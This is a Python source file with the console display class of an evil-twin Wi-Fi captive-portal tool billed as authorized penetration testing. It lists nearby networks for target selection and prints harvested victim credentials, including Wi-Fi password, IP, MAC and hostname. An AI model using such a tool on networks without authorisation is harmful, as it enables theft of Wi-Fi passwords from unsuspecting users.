import sys
from typing import List


class Display:
    R = '\033[0m'
    RED = '\033[91m'
    GRN = '\033[92m'
    YLW = '\033[93m'
    BLU = '\033[94m'
    CYN = '\033[96m'
    BLD = '\033[1m'

    def banner(self) -> None:
        print(f"""{self.BLD}{self.RED}
  ███████╗██╗   ██╗██╗██╗      ██╗    ██╗██╗███████╗██╗
  ██╔════╝██║   ██║██║██║      ██║    ██║██║██╔════╝██║
  █████╗  ██║   ██║██║██║      ██║ █╗ ██║██║█████╗  ██║
  ██╔══╝  ╚██╗ ██╔╝██║██║      ██║███╗██║██║██╔══╝  ██║
  ███████╗ ╚████╔╝ ██║███████╗ ╚███╔███╔╝██║██║     ██║
  ╚══════╝  ╚═══╝  ╚═╝╚══════╝  ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝{self.R}
  {self.YLW}Authorized Penetration Testing — Evil Twin Portal{self.R}
""")

    def info(self, msg: str) -> None:
        print(f"{self.BLU}[*]{self.R} {msg}")

    def success(self, msg: str) -> None:
        print(f"{self.GRN}[+]{self.R} {msg}")

    def warning(self, msg: str) -> None:
        print(f"{self.YLW}[!]{self.R} {msg}")

    def error(self, msg: str) -> None:
        print(f"{self.RED}[-]{self.R} {msg}", file=sys.stderr)

    def select_network(self, networks: List) -> object:
        print(f"\n{self.BLD}{'#':<4} {'SSID':<30} {'BSSID':<19} {'CH':<4} {'dBm':<7} Enc{self.R}")
        print('─' * 70)
        for i, n in enumerate(networks, 1):
            enc_color = self.GRN if n.encryption == 'Open' else self.YLW
            print(
                f"{i:<4} {n.ssid:<30} {n.bssid:<19} {n.channel:<4} "
                f"{n.signal:<7} {enc_color}{n.encryption}{self.R}"
            )

        while True:
            try:
                raw = input(f"\n{self.BLD}Select target [1-{len(networks)}]: {self.R}").strip()
                idx = int(raw) - 1
                if 0 <= idx < len(networks):
                    return networks[idx]
                self.warning("Out of range, try again.")
            except (ValueError, EOFError):
                self.warning("Enter a number.")
            except KeyboardInterrupt:
                print()
                raise

    def credential_captured(self, cred) -> None:
        bar = '═' * 50
        print(f"\n{self.BLD}{self.GRN}{bar}{self.R}")
        print(f"  {self.BLD}{self.GRN}CREDENTIAL CAPTURED{self.R}")
        print(f"  SSID:     {self.CYN}{cred.ssid}{self.R}")
        print(f"  Password: {self.BLD}{self.GRN}{cred.password}{self.R}")
        print(f"  IP:       {cred.ip}")
        print(f"  MAC:      {cred.mac}")
        print(f"  Hostname: {cred.hostname}")
        print(f"  Time:     {cred.timestamp}")
        print(f"{self.BLD}{self.GRN}{bar}{self.R}\n")
